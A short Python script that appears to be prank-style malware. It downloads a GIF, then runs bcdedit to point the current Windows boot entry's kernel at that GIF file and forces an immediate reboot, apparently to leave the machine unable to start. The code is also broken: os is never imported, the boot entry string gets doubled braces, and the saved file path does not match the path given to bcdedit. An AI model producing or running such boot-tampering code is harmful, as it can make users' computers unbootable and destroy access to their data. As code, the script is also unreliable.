import shutil
import requests
import ctypes

gif_url = "https://64.media.tumblr.com/acda81d74755683b00252baddbc9efb9/c94dfc5c1b3959c9-d3/s540x810/928b2b8c517da84965873e7a17bff6400102f897.gifv"
response = requests.get(gif_url, stream=True)
with open("boot.gif", "wb") as gif_file:
    shutil.copyfileobj(response.raw, gif_file)

bcdedit_path = r"C:\Windows\System32\bcdedit.exe"
boot_entry_id = "{current}"
shell_path = r"C:\boot.gif"
shell_option = "/set {bootmgr} displaybootmenu yes"
boot_entry_option = f"/set {{{boot_entry_id}}} kernel {shell_path}"
os.system(f"{bcdedit_path} {shell_option}")
os.system(f"{bcdedit_path} {boot_entry_option}")

ctypes.windll.user32.ExitWindowsEx(2, 0)
